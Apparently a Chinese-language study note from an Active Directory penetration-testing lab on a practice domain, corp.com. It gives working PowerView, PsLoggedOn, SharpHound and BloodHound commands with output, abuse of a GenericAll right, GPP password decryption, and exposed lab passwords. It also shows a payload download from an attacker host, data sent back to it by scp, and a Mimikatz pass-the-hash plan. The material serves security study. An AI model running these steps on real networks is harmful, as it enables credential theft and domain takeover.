DC1      Windows Server 2022 Standard DC1.corp.com
web04    Windows Server 2022 Standard web04.corp.com
files04  Windows Server 2022 Standard FILES04.corp.com
client74 Windows 11 Enterprise        client74.corp.com
client75 Windows 11 Enterprise        client75.corp.com
client76 Windows 10 Pro               CLIENT76.corp.com
```
>[!Note]
> Question:\
> Continue enumerating the operating systems. What is the exact operating system version for FILES04? Make sure to provide both the major and minor version number in the answer.\
> `Get-NetComputer -name files04 | select name,operatingsystem,operatingsystemversion`

### Getting an Overview - Permissions and Logged on Users
Active Directory（AD）內部的關係與潛在攻擊路徑，特別關注 使用者、電腦與權限之間的關聯性。\
找出可能的 Attack Vectors:
- 哪些使用者有較高權限？
- 哪些電腦上有可利用的已登入帳號？
- 找到一條路徑來提權？

>[!Tip]
>**為什麼權限與已登入使用者很重要？**
>- (1) 取得其他使用者的憑證
    - 當使用者登入某台電腦 時，他們的 Credentials 可能會被快取在記憶體。
    - 若竊取這些憑證，我就能冒充這些使用者，甚至進一步提權
>- (2) 建立「持久性」存取
    - 若只依賴單一帳號，一旦密碼被重設或帳號被鎖定，就會失去存取權限。
    - 應該尋找 其他擁有相同或更高權限的帳號，即使原始帳號被禁用，仍能繼續存取 AD 環境。
>- (3) 鏈式滲透（Chained Compromise）
    - 不一定要直接獲取 Domain Admins 權限。
    - 可能存在 擁有更高權限的其他帳號（例如 Service Accounts），可以利用這些帳號來存取重要系統，如：檔案伺服器, 資料庫, Web 伺服器

PowerView 的 `Find-LocalAdminAccess` 作用是 掃描網域內的所有電腦，判斷我們目前的使用者是否擁有某些電腦的本機管理員（Local Administrator）權限\
`Find-LocalAdminAccess` 依賴在 [OpenServiceW function](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew) 中，Windows 提供 OpenServiceW API 來讓應用程式或管理員管理系統上的服務。例如：啟動或停止 Windows 服務、修改服務的設定、刪除或安裝服務，不需要直接嘗試登入。

SCM（Service Control Manager）是 Windows 內建系統級的資料庫，存放了所有 Windows 服務與驅動程式的資訊，負責 啟動、停止、管理服務，所有 Windows 電腦都有 SCM，且存取 SCM 需要足夠的權限。\
PowerView 會嘗試存取 SCM，並請求 `SC_MANAGER_ALL_ACCESS`，若存取成功，代表我們擁有該機器的 Local Admin 權限

#### 1. 找出我們當前帳戶的管理權限 (Find-LocalAdminAccess)
使用 PowerView 的 `Find-LocalAdminAccess` ，掃描我們目前帳戶 是否擁有其他機器的管理權限
```
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> Find-LocalAdminAccess
client74.corp.com
```
> 表示目前的帳戶 stephanie 在 client74.corp.com 上擁有本機管理員Local Admin 權限。

#### 2. 找出目前已登入的使用者 (Get-NetSession -ComputerName ...)
目前有哪些使用者已登入哪些電腦，使用 PowerView 的 `Get-NetSession` 指令
```
PS C:\Tools> Get-NetSession -ComputerName files04
PS C:\Tools> Get-NetSession -ComputerName web04
```
> 沒有結果，可能代表：
> 1. 沒有使用者登入
> 2. 帳戶沒有權限查詢

`-Verbose` 檢查錯誤
```
PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied
PS C:\Tools> Get-NetSession -ComputerName web04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied
```
> 權限不足

##### 2.1 嘗試在擁有管理權限的機器上查詢登入使用者
上述得知 stephanie 在 client74.corp.com 是 local admin
```
PS C:\Tools> Get-NetSession -ComputerName client74


CName        : \\192.168.145.75
UserName     : stephanie
Time         : 0
IdleTime     : 0
ComputerName : client74
```
雖然這看起來像是 client74 的資訊，但實際上這個 IP 是 client75 的 IP，表示輸出結果可能有誤。\
我們需要改用其他工具來查詢已登入使用者。
>[!Tip]
>[NetSessionEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum) API 的問題\
>PowerView 的 Get-NetSession 指令是基於 Windows 的 NetSessionEnum API，而 NetSessionEnum 有 不同的查詢層級（Query Levels）\
>![image](https://hackmd.io/_uploads/rkT_OWqiJg.png)\
>PowerView 預設是使用 NetSessionEnum Level 10，即使 NetSessionEnum Level 10 不需要管理員權限，但它依賴 Windows 註冊表（Registry）內的存取權限，這可能影響查詢結果。

以透過 PowerShell 來檢查 SrvsvcSessionInfo 註冊表的存取權限：
```
PS C:\Tools> Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultS
         ecurity\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
Audit  :
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1
         -15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)

```
> `BUILTIN\Users` 只有 ReadKey 權限。`Get-NetSession` 依賴 NetSessionEnum API 來查詢已登入使用者。在 `Windows 10 版本 1709` 之後，Microsoft 加強了 NetSessionEnum 的權限，並將一般使用者的存取限制為 `ReadKey`，無法讀取完整的 session 資訊。只有 Administrators 或 SYSTEM 帳戶擁有完整控制權限，所以 普通使用者（如 stephanie）無法成功執行 Get-NetSession。

可以使用 `Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion`:\
環境運作在 Windows 10 Pro

#### 3. 使用 PsLoggedOn 來查詢已登入使用者
可以使用其他工具，例如 [SysInternals Suite](https://learn.microsoft.com/en-us/sysinternals/) 中的[PsLoggedOn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) 應用程式\

由於 NetSessionEnum 受限，我們使用 SysInternals 的 PsLoggedOn 工具
>[!Note]
>PsLoggedOn 依賴 Remote Registry service
```
PS C:\Tools> cd .\PSTools\
PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeff
Unable to query resource logons
```
> 表示 jeff 這個使用者目前已登入 FILES04

```
PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

No one is logged on locally.
Unable to query resource logons
```
> WEB04 目前沒有使用者登入\
> 也有可能是無法存取該資訊

#### 4. 查詢 client74 的已登入使用者
```
PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     3/8/2025 10:26:57 AM       CORP\stephanie
```
> 1. ⚠️ jeffadmin 目前已登入 client74， jeffadmin 可能是 Domain Admin！
> 2. stephanie 透過共享資源登入 client74，`PsLoggedOn 也使用 NetSessionEnum API，在這種情況下需要登入才能運作`，因此與我們之前的 PowerView 測試結果一致。
>> 💡 如果我們擁有 client74 的管理權限，我們可能可以竊取 jeffadmin 的憑證

### Enumeration Through Service Principal Names
>[!Note]
>[Service Account](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-on-premises)（服務帳號）:
>- 當應用程式在 Windows 上執行時，它需要 使用者帳戶來執行。
>- 一般應用程式 由 使用者帳號 執行（如 user1 開啟 Word）。
>- 系統服務（Services） 由 服務帳號（Service Account） 執行，例如：[LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account), [LocalService](https://learn.microsoft.com/en-us/windows/win32/services/localservice-account), [NetworkService](https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account)
>
>但當 企業應用程式（如 SQL Server、Exchange、IIS）需要更高權限與網域整合時，通常會 使用網域帳號作為服務帳號。

>[!Note]
>**Service Principal Name（SPN）**
>當Exchange、MS SQL 或Internet 資訊服務(IIS)等應用程式 整合到 AD 中時，SPN 是 Active Directory（AD）中用來標識伺服器與服務的 identifier。\
SPN 的作用：
允許 Kerberos 驗證，正確找到對應的服務\
綁定特定帳號與服務，確保服務能夠被授權存取網域資源

如何 透過 SPN 枚舉網域內執行的應用程式與伺服器資訊

#### 1. 如何查詢 SPN？
在 AD Enumeration 時，SPN 可以幫助我們找出網域內運行的服務，甚至進一步發動 Kerberoasting 攻擊。
##### (1) 使用 `setspn.exe` 查詢 SPN
Windows 內建 setspn.exe 工具可以用來查詢 SPN\
利用先前 iterate domain users: `iis_service`
```
PS C:\Users\stephanie> setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80
```
> `is_service` 帳戶關聯了 `HTTP/web04.corp.com`，代表是 Web 伺服器
##### (2) 使用 PowerView 查詢 SPN
使用 PowerView 來查詢 所有擁有 SPN 的帳號
```
PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
```
> krbtgt 是 Kerberos 票據授權（TGT）帳號（後續章節探討）。\
iis_service 這個帳號 與 HTTP/web04.corp.com 綁定，說明這是 Web 伺服器。

#### 2. 解析 domain  IP
```
PS C:\Users\stephanie> nslookup web04.corp.com
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.161.70

Name:    web04.corp.com
Address:  192.168.161.72
```
> web04.corp.com 對應的內部 IP 是 192.168.161.72

透過瀏覽器瀏覽 192.168.161.72\
![image](https://hackmd.io/_uploads/BJFYf35s1g.png)
>需要密碼登入

### Enumerating Object Permissions
枚舉 Active Directory（AD）內的 Object 權限
>[!Note]
> **[Access Control List (ACL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)**\
> 在 AD 中，每個 Object 都有一組 存取控制清單（ACL，Access Control List），用來定義誰能存取該物件及擁有的權限。
> - (1) ACL 的結構
ACL 由多個 [Access Control Entry](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries)（ACE）組成。\
每個 ACE 指定某個使用者或群組是否擁有該物件的某些權限。
>- (2) 權限驗證流程
當一個 使用者嘗試存取 AD 內的 Object，AD 會執行：\
使用者提供 Access Token，其中包含該使用者的身分與權限資訊。\
目標物件的 ACL 檢查該存取權杖，決定是否允許存取。

>[!Important]
>ACL 權限:\
>![image](https://hackmd.io/_uploads/SJ6Zs42s1e.png)

#### 1. 使用 PowerView 枚舉 AD Object 的 ACL
使用 PowerView 的 `Get-ObjectAcl` 檢查 AD 物件的權限
```
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
...
```
> `ObjectSID`：stephanie 的 [Security Identifiers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) （SID）\
`ActiveDirectoryRights`：ReadProperty（允許讀取屬性）\
`SecurityIdentifier`：此權限授予 S-1-5-21-...-553。

#### 2. 轉換 SID 為可讀名稱
可以用 `Convert-SidToName` 來 轉換為可讀的名稱
```
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```
> 表示 `RAS and IAS Servers` group 擁有對 stephanie 的 讀取權限

根據 PowerView，SecurityIdentifier 屬性中的 SID 屬於 [RAS and IAS Servers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#ras-and-ias-servers) 的預設 AD 群組。

#### 3. 尋找擁有 GenericAll 權限的帳號 (最高權限)
使用 PowerView 查詢 具有最高權限（GenericAll）的帳號
```
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll

PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```
>以下對象擁有 GenericAll 權限：\
`S-1-5-21-...-512` → Domain Admins\
`S-1-5-21-...-1104` → stephanie\
`S-1-5-32-548` → Account Operators\
`S-1-5-18` → Local System\
`S-1-5-21-...-519` → Enterprise Admins
>> stephanie 也有 GenericAll 權限 ?!\
>> ![image](https://hackmd.io/_uploads/HJAW7S2jkx.png)

#### 4. 嘗試提權
當我們觀察 Management Department 時，只發現 `jen` 是唯一的成員\
利用 GenericAll 權限，透過 net.exe 將 stephanie 加入 Management Department 群組，取得更高權限
```
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.
```
驗證 stephanie 是否成功加入
```
PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
```
> 成功將 stephanie 加入 Management Department

#### 5. 清除復原痕跡
```
PS C:\Tools> net group "Management Department" stephanie /del /domain
PS C:\Tools> Get-NetGroup "Management Department" | select member
```

### Enumerating Domain Shares
網域共享資料夾（Domain Shares） 通常用來 儲存組織內部的文件、程式和設定檔案\
attacker 可以透過這些共享資料夾找到關鍵資訊，例如：Password, Domain Configuration, Scripts 等機密文件。
#### 1. 使用 PowerView 查找共享資料夾
使用 PowerView 的 `Find-DomainShare` 來列出所有網域內的共享資料夾
```
PS C:\Tools> Find-DomainShare

Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com
ADMIN$   2147483648 Remote Admin           CLIENT76.corp.com
C$       2147483648 Default share          CLIENT76.corp.com
IPC$     2147483651 Remote IPC             CLIENT76.corp.comip
```
> `SYSVOL` 和 `NETLOGON` 是預設的共享資料夾，通常存放 Group Policy 和 Logon Scripts\
`backup`、`docshare` 和 `sharing` 可能存放機密資訊

#### 2. 解析 `SYSVOL` 共享資料夾
```
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\

    Directory: \\dc1.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts

PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\

    Directory: \\dc1.corp.com\sysvol\corp.com\Policies

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:13 AM                oldpolicy
d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
```
看一下 oldpolicy
```
PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
```
> `cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"` 加密密碼\
>> 這種加密密碼通常來自於 GPP（[Group Policy Preferences](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11))），有機會被解密

>[!Tip]
>在 Windows 以前的版本中，系統管理員常用 GPP 來修改本機管理員密碼，但 GPP 密碼是使用已知金鑰加密的（AES-256）。

#### 3. 解密 GPP Password
使用 [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) 解密
```
┌──(chw㉿CHW)-[~]
└─$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```
> AD 內部內建管理員的密碼

#### - 檢查其他共享資料夾
##### (1) docshare 共享資料夾
```
PS C:\Tools> ls \\FILES04\docshare\


    Directory: \\FILES04\docshare


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   2:02 AM                docs


PS C:\Tools> ls \\FILES04\docshare\docs\


    Directory: \\FILES04\docshare\docs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   2:01 AM                do-not-share
-a----         9/21/2022   2:03 AM            242 environment.txt

PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share\


    Directory: \\FILES04\docshare\docs\do-not-share


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2022   2:02 AM           1142 start-email.txt
```
##### (2) 查看 `\docs\do-not-share\start-email.txt`
```
PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
Hi Jeff,

...
The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11

...

Best Regards
Stephanie

...............


Hey Stephanie,

...

Best regards
Jeff
```
>這封電子郵件 包含 jeff 的明文密碼: HenchmanPutridBonbon11

## Active Directory - Automated Enumeration
如何 自動化 Active Directory（AD）枚舉，透過 [SharpHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17481151861019-SharpHound-Community-Edition) 來收集網域資料，並使用 [BloodHound](https://support.bloodhoundenterprise.io/hc/en-us) 來分析這些資料
### Collecting Data with SharpHound
>[!Note]
>[SharpHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17481151861019-SharpHound-Community-Edition)\
SharpHound 是 BloodHound 的資料收集工具，它是一個用 C# 編寫的工具，可以透過：
>- Windows API
>- LDAP 查詢
>- [NetWkstaUserEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmwksta/nf-lmwksta-netwkstauserenum) 和 [NetSessionEnum](https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum)（獲取已登入的使用者）
>- 遠端登錄（Remote Registry）

SharpHound 主要收集的內容包括：
- 使用者與群組資訊（User & Group）
- 本機管理員權限（Local Admin）
- GPO 本機群組（Group Policy Objects）
- 遠端桌面權限（RDP）
- 服務主體名稱（SPN）
- 系統 ACL（權限控制清單）
- 遠端 PowerShell 連線（PSRemote）
- 信任關係（Trusts）
- 已登入的使用者（LoggedOn Users）

收集到的資料後會儲存為 JSON 格式，並打包成 .zip 檔

#### 1. 下載並傳送 SharpHound
Kali Linux 下載最新版本的 SharpHound (參考用)
```
┌──(chw㉿CHW)-[~]
└─$ wget https://github.com/SpecterOps/SharpHound/releases/download/v2.6.0/SharpHound-v2.6.0.zip
┌──(chw㉿CHW)-[~]
└─$ unzip SharpHound-v2.6.0.zip -d SharpHound
```
>[!Caution]
>這裡建議直接使用 BloodHound 內建的 SharpHound，若在 github 上下載最新版，可能會導致 BloodHound 與 SharpHound 版本不相容，在 BloodHound 上傳 JSON 時會失敗。\
>`sudo apt install bloodhound `\
>`cd /usr/lib/bloodhound/resources/app/Collectors`

```
┌──(chw㉿CHW)-[/usr/…/bloodhound/resources/app/Collectors]
└─$ ls
AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
                                                    
┌──(chw㉿CHW)-[/usr/…/bloodhound/resources/app/Collectors]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
在 Kali Linux 下載最新版本的 SharpHound，並將 `Sharphound.ps1` 傳送到目標機器
```
PS C:\Users\stephanie\Downloads>  iwr -uri http://192.168.45.159/SharpHound.ps1 -Outfile SharpHound.ps1
```
#### 2. 啟用 SharpHound
```
PS C:\Users\stephanie\Downloads> powershell -ep bypass
PS C:\Users\stephanie\Downloads> . .\SharpHound.ps1
PS C:\Users\stephanie\Downloads> Get-Help Invoke-BloodHound

NAME
    Invoke-BloodHound

SYNOPSIS
    Runs the BloodHound C# Ingestor using reflection. The assembly is stored in this file.


SYNTAX
    Invoke-BloodHound [-CollectionMethods <String[]>] [-Domain <String>] [-SearchForest] [-Stealth] [-LdapFilter
    <String>] [-DistinguishedName <String>] [-ComputerFile <String>] [-OutputDirectory <String>] [-OutputPrefix
    <String>] [-CacheName <String>] [-MemCache] [-RebuildCache] [-RandomFilenames] [-ZipFilename <String>] [-NoZip]
    [-ZipPassword <String>] [-TrackComputerCalls] [-PrettyPrint] [-LdapUsername <String>] [-LdapPassword <String>]
    [-DomainController <String>] [-LdapPort <Int32>] [-SecureLdap] [-DisableCertVerification] [-DisableSigning]
    [-SkipPortCheck] [-PortCheckTimeout <Int32>] [-SkipPasswordCheck] [-ExcludeDCs] [-Throttle <Int32>] [-Jitter
    <Int32>] [-Threads <Int32>] [-SkipRegistryLoggedOn] [-OverrideUsername <String>] [-RealDNSName <String>]
    [-CollectAllProperties] [-Loop] [-LoopDuration <String>] [-LoopInterval <String>] [-StatusInterval <Int32>]
    [-Verbosity <Int32>] [-Help] [-Version] [<CommonParameters>]


DESCRIPTION
    Using reflection and assembly.load, load the compiled BloodHound C# ingestor into memory
    and run it without touching disk. Parameters are converted to the equivalent CLI arguments
    for the SharpHound executable and passed in via reflection. The appropriate function
    calls are made in order to ensure that assembly dependencies are loaded properly.


RELATED LINKS

REMARKS
    To see the examples, type: "get-help Invoke-BloodHound -examples".
    For more information, type: "get-help Invoke-BloodHound -detailed".
    For technical information, type: "get-help Invoke-BloodHound -full".
```
Get-Help 了解指令

#### 3. SharpHound 進行 Active Directory 枚舉
```
PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
...
2025-03-10T08:46:06.5021580-07:00|INFORMATION|Status: 309 objects finished (+309 309)/s -- Using 140 MB RAM
...
```
>`-CollectionMethod All`：所有可用的 Active Directory 資訊\
`-OutputDirectory C:\Users\stephanie\Desktop\`：將結果存放到 桌面\
`-OutputPrefix "corp audit"`：輸出檔案的名稱前綴
>> 總共掃描了 309 個 Object

列出 SharpHound 產生的檔案：
```
PS C:\Users\stephanie\Downloads> ls C:\Users\stephanie\Desktop\


    Directory: C:\Users\stephanie\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2025   8:46 AM          28113 corp audit_20250310084605_BloodHound.zip
-a----         3/10/2025   8:46 AM           2050 ZTZjMzY2NTMtZjZiOS00YmY4LTk1ZmMtMDE5MjQxN2ZkYTZj.bin
```
> 用 BloodHound 來分析的 AD 結構與權限關係

>[!Note]
> SharpHound 可以使用 Loop 觀察長時間 domain 中發生的變化:
> ```
> Invoke-BloodHound -CollectionMethod All -Loop -LoopDuration 2h -LoopInterval 5m -OutputDirectory C:\Users\stephanie\Desktop\
> ```
> `-Loop`：啟用循環收集\
`-LoopDuration 2h`：執行 2 小時\
`-LoopInterval 5m`：每 5 分鐘 進行一次收集

### Analysing Data using BloodHound
BloodHound 依賴 [Neo4j](https://neo4j.com/) (一種圖形資料庫) 來儲存和分析 AD 資料。在 Kali Linux 中，Neo4j 是 APT 安裝 BloodHound 時自動安裝的
#### 1. 啟動 Neo4j 資料庫
```
┌──(chw㉿CHW)-[~]
└─$ sudo neo4j start           
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:1880421). It is available at http://localhost:7474
There may be a short delay until the server is ready.

```
透過瀏覽器開啟 http://localhost:7474 登入 Neo4j，預設帳號/密碼為：`neo4j`/`neo4j`\
![image](https://hackmd.io/_uploads/rJyC0K2ikx.png)

#### 2. 啟動 BloodHound
```
┌──(chw㉿CHW)-[~]
└─$ bloodhound
(node:1884189) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:1884237) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.

```
打開 BloodHound UI，並要求我們輸入 Neo4j 的帳號密碼 來登入資料庫\
![image](https://hackmd.io/_uploads/B1jukqhokg.png)

#### 3. 上傳 SharpHound 收集的資料
透過 scp 傳回 Kali
```
PS C:\Users\stephanie\Desktop> scp "C:\Users\stephanie\Desktop\corp audit_20250310084605_BloodHound.zip" chw@192.168.45.159:~/corp_audit.zip
chw@192.168.45.159's password:
corp audit_20250310084605_BloodHound.zip                                              100%   27KB 146.4KB/s   00:00
PS C:\Users\stephanie\Desktop>
```
在 BloodHound 上傳 `.zip`\
![image](https://hackmd.io/_uploads/rJVWmcnoye.png)

#### 4. 確認資料庫中的資訊
在左上角點擊 Hamburger menu ☰ > Database Info\
![image](https://hackmd.io/_uploads/S1YygOpoye.png)
> 總共發現了:
> - 10 個使用者
> - 57 個群組
> - 5 個活動中的 Session
> - 多個 ACL（權限）

#### 5. 尋找 Domain Admins
在 Analysis 中選擇 `Find all Domain Admins`\
![image](https://hackmd.io/_uploads/BJuUrOpjJl.png)
```
[JeffAdmin]  →  [Domain Admins]
[Administrator]  →  [Domain Admins]
```
在 Settings > Node Label Display 中可以選擇 Always Display

#### 6. 尋找最短攻擊路徑
在 Analysis 選單 選擇 `Find Shortest Paths to Domain Admins`
![image](https://hackmd.io/_uploads/r1EZDu6iJx.png)\
顯示 `Stephanie` → `CLIENT74` → `JeffAdmin (Domain Admin)` 的關係：\
- Stephanie 在 CLIENT74 有管理員權限 (AdminTo)
- JeffAdmin 在 CLIENT74 有登入 Session
- JeffAdmin 是 Domain Admins 成員

代表 如果可以在 CLIENT74 取得 JeffAdmin 的憑證，就能直接成為 Domain Admin！

#### - 標記已控制的資源
已經控制了某些電腦或帳戶，可以手動標記它們為 Owned (已控制)：\
搜尋 Stephanie，右鍵 `Mark User as Owned`
搜尋 CLIENT75，右鍵 `Mark Computer as Owned`
這樣，我們可以使用 `Find Shortest Paths to Domain Admins from Owned Principals`，分析 從我們控制的帳號到 Domain Admin 的最快攻擊路徑。

#### 7. 最終攻擊計畫
在 BloodHound 中，我們的最佳攻擊路徑是：
1. Stephanie 已經控制 CLIENT74（因為她有 AdminTo 權限）
2. JeffAdmin 曾在 CLIENT74 登入，憑證可能留在記憶體
3. 使用 Mimikatz 抓取記憶體中的 NTLM Hash
4. Pass-the-Hash 或 Pass-the-Ticket 技術模擬 JeffAdmin 登入
5. 取得 Domain Admin 權限

>[!Note]
>Q: Search for the Management Department group in BloodHound and use the Node Info tab to have a look at the Inbound Control Rights for the group. Who is currently the owner of the Management Department group?
>Ans: 
>1. 在 BloodHound 中搜尋 "Management Department" 群組。
>2. 點擊 Node Info（節點資訊）頁籤。
>3. 檢視 Inbound Control Rights（內部控制權限）。
>4. 擁有者（Owner） 欄位會顯示目前擁有該群組控制權的使用者。

